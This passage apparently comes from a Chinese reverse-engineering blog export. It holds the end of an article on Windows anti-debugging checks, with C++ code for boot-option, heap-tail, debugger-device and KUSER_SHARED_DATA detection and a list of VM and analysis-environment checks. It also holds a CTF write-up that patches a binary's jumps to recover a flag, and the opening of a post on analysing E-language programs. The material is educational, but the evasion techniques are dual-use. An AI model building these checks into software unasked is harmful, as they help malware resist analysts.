class=\"number\">0</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">            pImageSectionHeader-&gt;PointerToRawData + pImageSectionHeader-&gt;SizeOfRawData);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">NULL</span> == pMappedImageBase) __leave;</span><br><span class=\"line\">        PIMAGE_NT_HEADERS pImageNtHeaders = <span class=\"built_in\">GetImageNtHeaders</span>(pMappedImageBase);</span><br><span class=\"line\">        PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pMappedImageBase </span><br><span class=\"line\">            + (pImageSectionHeader-&gt;PointerToRawData</span><br><span class=\"line\">                + (pImageNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress - pImageSectionHeader-&gt;VirtualAddress)));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pImageLoadConfigDirectory-&gt;GlobalFlagsClear != <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            std::cout &lt;&lt; <span class=\"string\">&quot;Stop debugging program!&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">            <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    __finally</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">NULL</span> != pMappedImageBase)</span><br><span class=\"line\">            <span class=\"built_in\">UnmapViewOfFile</span>(pMappedImageBase);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">NULL</span> != hExecutableMapping)</span><br><span class=\"line\">            <span class=\"built_in\">CloseHandle</span>(hExecutableMapping);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (INVALID_HANDLE_VALUE != hExecutable)</span><br><span class=\"line\">            <span class=\"built_in\">CloseHandle</span>(hExecutable);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SystemBoot\"><a href=\"#SystemBoot\" class=\"headerlink\" title=\"SystemBoot\"></a>SystemBoot</h2><p>可以通过枚举系统启动项中是否存在debug相关字符串判断是否处于调试模式。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">CheckDebugBoot</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> hKey = <span class=\"built_in\">HKEY</span>(<span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> dwRegOpenRet = <span class=\"built_in\">RegOpenKeyExA</span>(HKEY_LOCAL_MACHINE, <span class=\"built_in\">xorstr</span>(<span class=\"string\">&quot;System\\\\CurrentControlSet\\\\Control&quot;</span>).<span class=\"built_in\">crypt_get</span>(), <span class=\"number\">0</span>, KEY_READ, &amp;hKey);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwRegOpenRet != ERROR_SUCCESS)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">char</span> szBootOptions[<span class=\"number\">1024</span>]\t= &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> dwLen\t\t\t\t\t= <span class=\"built_in\">DWORD</span>(<span class=\"built_in\">sizeof</span>(szBootOptions) - <span class=\"built_in\">sizeof</span>(CHAR));</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> dwRegGetRet\t\t\t= <span class=\"built_in\">RegGetValueA</span>(hKey, <span class=\"literal\">NULL</span>, <span class=\"built_in\">xorstr</span>(<span class=\"string\">&quot;SystemStartOptions&quot;</span>).<span class=\"built_in\">crypt_get</span>(), RRF_RT_REG_SZ, <span class=\"literal\">NULL</span>, szBootOptions, &amp;dwLen);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwRegGetRet != ERROR_SUCCESS)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tg_winapiApiTable-&gt;<span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> szLowerOptions =<span class=\"built_in\">szLower</span>(szBootOptions);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(szLowerOptions.<span class=\"built_in\">c_str</span>(), <span class=\"built_in\">xorstr</span>(<span class=\"string\">&quot;debug&quot;</span>).<span class=\"built_in\">crypt_get</span>()))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"五、堆检测\"><a href=\"#五、堆检测\" class=\"headerlink\" title=\"五、堆检测\"></a>五、堆检测</h1><h2 id=\"HeapTail\"><a href=\"#HeapTail\" class=\"headerlink\" title=\"HeapTail\"></a>HeapTail</h2><p>如果处于调试中，堆尾部也会留下痕迹。标志HEAP_TAIL_CHECKING_ENABLED 将会在分配的堆块尾部生成两个0xABABABAB。如果需要额外的字节来填充堆尾，HEAP_FREE_CHECKING_ENABLED标志则会生成0xFEEEFEEE。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">CheckHeapTail</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDWORD flag[] = &#123; <span class=\"number\">0xabababab</span>, <span class=\"number\">0xabababab</span> &#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> buff = <span class=\"built_in\">reinterpret_cast</span>&lt;DWORD_PTR&gt;(g_nmApp-&gt;<span class=\"built_in\">DynamicWinapiInstance</span>()-&gt;<span class=\"built_in\">NTHelper</span>()-&gt;<span class=\"built_in\">Alloc</span>(<span class=\"number\">32</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> temp = buff + <span class=\"number\">32</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> dwRet = <span class=\"built_in\">memcmp</span>((LPVOID)temp, (LPVOID)flag, <span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tg_nmApp-&gt;<span class=\"built_in\">DynamicWinapiInstance</span>()-&gt;<span class=\"built_in\">NTHelper</span>()-&gt;<span class=\"built_in\">Free</span>(<span class=\"built_in\">reinterpret_cast</span>&lt;PVOID&gt;(buff));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> dwRet == <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"六、符号检查\"><a href=\"#六、符号检查\" class=\"headerlink\" title=\"六、符号检查\"></a>六、符号检查</h1><h2 id=\"Syser\"><a href=\"#Syser\" class=\"headerlink\" title=\"Syser\"></a>Syser</h2><p>调试工具通常会使用内核驱动，因此如果尝试是否可以打开一些调试器所用到的设备，就可判断是否存在调试器。</p>\n<blockquote>\n<p>\\\\.\\Syser</p>\n<p>\\\\.\\SyserBoot</p>\n<p>\\\\.\\SyserDbgMsg</p>\n<p>&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;images&#x2F;Anti&#x2F;&#x2F;SICE</p>\n<p>&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;images&#x2F;Anti&#x2F;&#x2F;SIWVID</p>\n<p>&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;images&#x2F;Anti&#x2F;&#x2F;SIWVIDSTART</p>\n<p>&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;images&#x2F;Anti&#x2F;&#x2F;NTICE</p>\n<p>&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;images&#x2F;Anti&#x2F;&#x2F;ICEEXT</p>\n<p>&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;images&#x2F;Anti&#x2F;&#x2F;TRW</p>\n<p>&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;images&#x2F;Anti&#x2F;&#x2F;TRWDEBUG</p>\n</blockquote>\n<h1 id=\"七、ETC\"><a href=\"#七、ETC\" class=\"headerlink\" title=\"七、ETC\"></a>七、ETC</h1><p>是一种通过直接检测当前程序、窗口等等中是否含有常见反调试软件，如果有则停止程序。</p>\n<ol>\n<li><p>检测调试器窗口—–&gt;FindWindow()</p>\n</li>\n<li><p>检测调试器进程——&gt;CreatToolhelp32Snapshot（）</p>\n</li>\n<li><p>检查计算机名称是否为“TEST”，“ANALYSIS”等——-&gt;GetComputerName（）</p>\n</li>\n<li><p>检查程序运行路径是否存在“TEST”，“SAMPLE”等名称——-&gt;GetCommandLine()</p>\n</li>\n<li><p>检测虚拟机是否处于运行状态（查看虚拟机特有的进程名称—-&gt;VMWareService.exe，VMWareTray.exe，VMWareUser.exe等）</p>\n</li>\n<li><p>枚举每个进程下的一些特殊文件。</p>\n</li>\n<li><p>检查每个进程的资源。</p>\n</li>\n<li><p>等等…..</p>\n</li>\n</ol>\n<h1 id=\"八、其他\"><a href=\"#八、其他\" class=\"headerlink\" title=\"八、其他\"></a>八、其他</h1><h2 id=\"KUSER-SHARED-DATA\"><a href=\"#KUSER-SHARED-DATA\" class=\"headerlink\" title=\"KUSER_SHARED_DATA\"></a>KUSER_SHARED_DATA</h2><p>无论是在 32 位系统内存分布，还是在 64 位系统内存分布中，我们知道高地址空间分配给系统内核使用，低地址空间分配给用户进程使用。</p>\n<p>事实上，用户空间和内核空间其实有一块共享区域（KUSER_SHARED_DATA），大小为 4 KB。它们的内存地址虽然不一样，但是它们都是有同一块物理内存映射出来的，KdDebuggerEnabled 就在存放这一块内存里。</p>\n<p>对于 32 位系统和 64 位系统来说，这块共享区域对应的内核地址范围以及对应用户空间的地址范围如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th>mode</th>\n<th>kernel start</th>\n<th>kernel end</th>\n<th>user start</th>\n<th>user end</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>x86</td>\n<td>0xFFDF0000</td>\n<td>0xFFDF0FFF</td>\n<td>0x7FFE0000</td>\n<td>0x7FFE0FFF</td>\n</tr>\n<tr>\n<td>x64</td>\n<td>0xFFFFF78000000000</td>\n<td>0xFFFFF78000000FFF</td>\n<td>0x7FFE0000</td>\n<td>0x7FFE0FFF</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dt _KUSER_SHARED_DATA     // win11前</span><br><span class=\"line\">nt!_KUSER_SHARED_DATA</span><br><span class=\"line\">   +0x000 TickCountLowDeprecated : Uint4B</span><br><span class=\"line\">   +0x004 TickCountMultiplier : Uint4B</span><br><span class=\"line\">   +0x008 InterruptTime    : _KSYSTEM_TIME</span><br><span class=\"line\">   +0x014 SystemTime       : _KSYSTEM_TIME</span><br><span class=\"line\">   +0x020 TimeZoneBias     : _KSYSTEM_TIME</span><br><span class=\"line\">   +0x02c ImageNumberLow   : Uint2B</span><br><span class=\"line\">   +0x02e ImageNumberHigh  : Uint2B</span><br><span class=\"line\">   +0x030 NtSystemRoot     : [260] Wchar</span><br><span class=\"line\">   +0x238 MaxStackTraceDepth : Uint4B</span><br><span class=\"line\">   +0x23c CryptoExponent   : Uint4B</span><br><span class=\"line\">   +0x240 TimeZoneId       : Uint4B</span><br><span class=\"line\">   +0x244 LargePageMinimum : Uint4B</span><br><span class=\"line\">   +0x248 AitSamplingValue : Uint4B</span><br><span class=\"line\">   +0x24c AppCompatFlag    : Uint4B</span><br><span class=\"line\">   +0x250 RNGSeedVersion   : Uint8B</span><br><span class=\"line\">   +0x258 GlobalValidationRunlevel : Uint4B</span><br><span class=\"line\">   +0x25c TimeZoneBiasStamp : Int4B</span><br><span class=\"line\">   +0x260 NtBuildNumber    : Uint4B</span><br><span class=\"line\">   +0x264 NtProductType    : _NT_PRODUCT_TYPE</span><br><span class=\"line\">   +0x268 ProductTypeIsValid : UChar</span><br><span class=\"line\">   +0x269 Reserved0        : [1] UChar</span><br><span class=\"line\">   +0x26a NativeProcessorArchitecture : Uint2B</span><br><span class=\"line\">   +0x26c NtMajorVersion   : Uint4B</span><br><span class=\"line\">   +0x270 NtMinorVersion   : Uint4B</span><br><span class=\"line\">   +0x274 ProcessorFeatures : [64] UChar</span><br><span class=\"line\">   +0x2b4 Reserved1        : Uint4B</span><br><span class=\"line\">   +0x2b8 Reserved3        : Uint4B</span><br><span class=\"line\">   +0x2bc TimeSlip         : Uint4B</span><br><span class=\"line\">   +0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE</span><br><span class=\"line\">   +0x2c4 BootId           : Uint4B</span><br><span class=\"line\">   +0x2c8 SystemExpirationDate : _LARGE_INTEGER</span><br><span class=\"line\">   +0x2d0 SuiteMask        : Uint4B</span><br><span class=\"line\">   +0x2d4 KdDebuggerEnabled : UChar                            // &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;  划重点 </span><br><span class=\"line\">   +0x2d5 MitigationPolicies : UChar</span><br><span class=\"line\">   +0x2d5 NXSupportPolicy  : Pos 0, 2 Bits</span><br><span class=\"line\">   +0x2d5 SEHValidationPolicy : Pos 2, 2 Bits</span><br><span class=\"line\">   +0x2d5 CurDirDevicesSkippedForDlls : Pos 4, 2 Bits</span><br><span class=\"line\">   +0x2d5 Reserved         : Pos 6, 2 Bits</span><br><span class=\"line\">   +0x2d6 Reserved6        : [2] UChar</span><br><span class=\"line\">   +0x2d8 ActiveConsoleId  : Uint4B</span><br><span class=\"line\">   +0x2dc DismountCount    : Uint4B</span><br><span class=\"line\">   +0x2e0 ComPlusPackage   : Uint4B</span><br><span class=\"line\">   +0x2e4 LastSystemRITEventTickCount : Uint4B</span><br><span class=\"line\">   +0x2e8 NumberOfPhysicalPages : Uint4B</span><br><span class=\"line\">   +0x2ec SafeBootMode     : UChar</span><br><span class=\"line\">   +0x2ed VirtualizationFlags : UChar</span><br><span class=\"line\">   +0x2ee Reserved12       : [2] UChar</span><br><span class=\"line\">   +0x2f0 SharedDataFlags  : Uint4B</span><br><span class=\"line\">   +0x2f0 DbgErrorPortPresent : Pos 0, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgElevationEnabled : Pos 1, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgVirtEnabled   : Pos 2, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgInstallerDetectEnabled : Pos 3, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgLkgEnabled    : Pos 4, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgDynProcessorEnabled : Pos 5, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgConsoleBrokerEnabled : Pos 6, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgSecureBootEnabled : Pos 7, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgMultiSessionSku : Pos 8, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgMultiUsersInSessionSku : Pos 9, 1 Bit</span><br><span class=\"line\">   +0x2f0 DbgStateSeparationEnabled : Pos 10, 1 Bit</span><br><span class=\"line\">   +0x2f0 SpareBits        : Pos 11, 21 Bits</span><br><span class=\"line\">   +0x2f4 DataFlagsPad     : [1] Uint4B</span><br><span class=\"line\">   +0x2f8 TestRetInstruction : Uint8B</span><br><span class=\"line\">   +0x300 QpcFrequency     : Int8B</span><br><span class=\"line\">   +0x308 SystemCall       : Uint4B</span><br><span class=\"line\">   +0x30c SystemCallPad0   : Uint4B</span><br><span class=\"line\">   +0x310 SystemCallPad    : [2] Uint8B</span><br><span class=\"line\">   +0x320 TickCount        : _KSYSTEM_TIME</span><br><span class=\"line\">   +0x320 TickCountQuad    : Uint8B</span><br><span class=\"line\">   +0x320 ReservedTickCountOverlay : [3] Uint4B</span><br><span class=\"line\">   +0x32c TickCountPad     : [1] Uint4B</span><br><span class=\"line\">   +0x330 Cookie           : Uint4B</span><br><span class=\"line\">   +0x334 CookiePad        : [1] Uint4B</span><br><span class=\"line\">   +0x338 ConsoleSessionForegroundProcessId : Int8B</span><br><span class=\"line\">   +0x340 TimeUpdateLock   : Uint8B</span><br><span class=\"line\">   +0x348 BaselineSystemTimeQpc : Uint8B</span><br><span class=\"line\">   +0x350 BaselineInterruptTimeQpc : Uint8B</span><br><span class=\"line\">   +0x358 QpcSystemTimeIncrement : Uint8B</span><br><span class=\"line\">   +0x360 QpcInterruptTimeIncrement : Uint8B</span><br><span class=\"line\">   +0x368 QpcSystemTimeIncrementShift : UChar</span><br><span class=\"line\">   +0x369 QpcInterruptTimeIncrementShift : UChar</span><br><span class=\"line\">   +0x36a UnparkedProcessorCount : Uint2B</span><br><span class=\"line\">   +0x36c EnclaveFeatureMask : [4] Uint4B</span><br><span class=\"line\">   +0x37c TelemetryCoverageRound : Uint4B</span><br><span class=\"line\">   +0x380 UserModeGlobalLogger : [16] Uint2B</span><br><span class=\"line\">   +0x3a0 ImageFileExecutionOptions : Uint4B</span><br><span class=\"line\">   +0x3a4 LangGenerationCount : Uint4B</span><br><span class=\"line\">   +0x3a8 Reserved4        : Uint8B</span><br><span class=\"line\">   +0x3b0 InterruptTimeBias : Uint8B</span><br><span class=\"line\">   +0x3b8 QpcBias          : Uint8B</span><br><span class=\"line\">   +0x3c0 ActiveProcessorCount : Uint4B</span><br><span class=\"line\">   +0x3c4 ActiveGroupCount : UChar</span><br><span class=\"line\">   +0x3c5 Reserved9        : UChar</span><br><span class=\"line\">   +0x3c6 QpcData          : Uint2B</span><br><span class=\"line\">   +0x3c6 QpcBypassEnabled : UChar</span><br><span class=\"line\">   +0x3c7 QpcShift         : UChar</span><br><span class=\"line\">   +0x3c8 TimeZoneBiasEffectiveStart : _LARGE_INTEGER</span><br><span class=\"line\">   +0x3d0 TimeZoneBiasEffectiveEnd : _LARGE_INTEGER</span><br><span class=\"line\">   +0x3d8 XState           : _XSTATE_CONFIGURATION</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">CheckSharedUserData</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> pUserSharedData = (KUSER_SHARED_DATA *)<span class=\"number\">0x7FFE0000</span>; <span class=\"comment\">// The fixed user mode address of KUSER_SHARED_DATA</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tBOOLEAN KdDebuggerEnabled\t\t= (pUserSharedData-&gt;KdDebuggerEnabled &amp; <span class=\"number\">0x1</span>) == <span class=\"number\">0x1</span>;</span><br><span class=\"line\">\tBOOLEAN KdDebuggerNotPresent\t= (pUserSharedData-&gt;KdDebuggerEnabled &amp; <span class=\"number\">0x2</span>) == <span class=\"number\">0x0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (KdDebuggerEnabled || !KdDebuggerNotPresent)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","categories":["Anti"]},{"title":"攻防世界-逆向题笔记{csaw2013reversing2}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/","content":"<p>分析对象：csaw2013reversing2</p>\n<p>工具：Ida、od、vs</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p>6）、解密</p>\n<p><strong>一、运行查看效果</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>直接提示了flag，但是是乱码。我们查一下壳。</p>\n<p><strong>二、PE工具查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>莫得壳</p>\n<p><strong>三、查看文件平台</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>32位，我们直接打开32位ida分析</p>\n<p><strong>四、脱壳</strong></p>\n<p>无</p>\n<p><strong>五、Ida分析</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>日常字符串搜索，但是除了就发现一个MessageBoxW的函数。我们直接去main函数看看。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>看到memcpy，我们看看他复制了什么。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>然后我们继续往下看代码可以看到一个反调试函数<strong>IsDebuggerPresent()<strong>，如果这个程序被调试，那么函数返回</strong>1</strong>，否则返回<strong>0</strong>。然后大概我们去看一下这个<strong>sub_40102A()。</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>看到他这个函数默认返回0，而且我们直接运行程序后，<strong>IsDebuggerPresent()<strong>也是0(<strong>因为我i们没有调试</strong>)，所以if里面的函数没有被执行。而if中的这个函数</strong>sub_401000(v3 + 4, (int)lpMem)，</strong>对lpMem做了手脚，所以猜测他是给flag运算。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>进来之后，看到算法。这里说一下两种方法，第一种依旧是用到调试器OD，第二种是直接跑脚本。</p>\n<p><strong>六、解密</strong></p>\n<p><strong>第一种方法：</strong></p>\n<p>找到if判断的地方，把跳转给nop或者改jmp，直接让其执行加密函数。大家可以在ida记录main函数的偏移，然后在od通过 <strong>镜像地址+偏移</strong> 得到main函数，也可以手动单步跟。这里我就直接单步跟。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>找到关键代码</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>修改后，直接在加密函数的位置下断（<strong>这里有一个坑，需要把int3给nop掉，因为这个int3本身是一个中断指令，导致程序直接崩掉</strong>）</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>运行后直接断下，我们F7进去。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>这里对应着ida这里</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>说明flag存在edx。我们在函数末尾下断后F9运行，直接查看edx的值。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p><strong>第二种方法：</strong></p>\n<p>lpMenm的值上面已经找到了，直接写脚本。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7Bcsaw2013reversing2%7D/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>这里就上一份百度来的代码。mlgb，别问为什么是C++，因为我python写不出，C++我也写不出。</p>\n<p><strong>总结：</strong></p>\n<p>无</p>\n","categories":["CTF"]},{"title":"撕开易语言程序","url":"/2024/04/21/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/","content":"<ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2021-11-28 20:45</li>\n</ul>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<h1 id=\"要点\"><a href=\"#要点\" class=\"headerlink\" title=\"要点\"></a>要点</h1><ul>\n<li>易语言的入口函数特征</li>\n<li>各种函数的调用特征以及识别</li>\n<li>针对易语言程序的分析插件</li>\n</ul>\n<h1 id=\"1、如何识别易语言程序\"><a href=\"#1、如何识别易语言程序\" class=\"headerlink\" title=\"1、如何识别易语言程序\"></a>1、如何识别易语言程序</h1><h3 id=\"一、查看文件信息右键-属性-详细信息\"><a href=\"#一、查看文件信息右键-属性-详细信息\" class=\"headerlink\" title=\"一、查看文件信息右键-属性-详细信息\"></a>一、查看文件信息右键-属性-详细信息</h3><p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<h3 id=\"二、查看资源文件Resource-Hacker或其他可查看资源文件的工具\"><a href=\"#二、查看资源文件Resource-Hacker或其他可查看资源文件的工具\" class=\"headerlink\" title=\"二、查看资源文件Resource Hacker或其他可查看资源文件的工具\"></a>二、查看资源文件Resource Hacker或其他可查看资源文件的工具</h3><p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<h3 id=\"三、库文件\"><a href=\"#三、库文件\" class=\"headerlink\" title=\"三、库文件\"></a>三、库文件</h3><p>易语言程序依赖于自实现的库(.<strong>fnr</strong>)执行，针对易语言的编译模式有静态编译、非静态编译和独立编译，如下图：</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<ul>\n<li>编译：编译程序时，会将所有需要用到的库文件生成到同程序的目录下。</li>\n</ul>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId10.png\" 